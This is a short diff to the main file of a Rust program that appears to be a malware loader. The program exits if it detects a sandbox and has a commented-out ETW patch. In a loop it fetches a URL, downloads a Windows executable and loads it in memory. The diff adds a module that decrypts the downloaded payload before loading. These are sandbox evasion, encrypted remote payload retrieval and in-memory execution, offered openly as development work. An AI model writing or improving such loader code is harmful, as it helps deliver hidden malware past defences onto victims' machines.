@@ -9,6 +9,7 @@ mod patcher;
 mod error;
 mod detector;
 mod fetch;
+mod decryptor;
 
 #[tokio::main]
 async fn main(){
@@ -53,9 +54,7 @@ async fn main(){
     if !detector::check_sandbox(){
         std::process::exit(0);
     };
-    
-    //new_ntdll_patch_etw().expect("Patching not okie");
-    
+
     loop {
         let url_str = match fetch::fetch_url(){
             Ok(_res) => _res,
@@ -88,7 +87,7 @@ async fn main(){
         };
 
         // Fetch PE
-        let pe_buf = match fetch::fetch_pe(url).await  {
+        let mut pe_buf = match fetch::fetch_pe(url).await  {
             Ok(_v) => _v,
             Err(e) => {
                 let err = format!("{}",e);
@@ -97,6 +96,8 @@ async fn main(){
             }
         };
 
+        // Decrypt PE buffer
+        decryptor::decrypt_stream(&mut pe_buf);
 
         // Load PE 
         let pe_parse = PE::new(&pe_buf).unwrap();
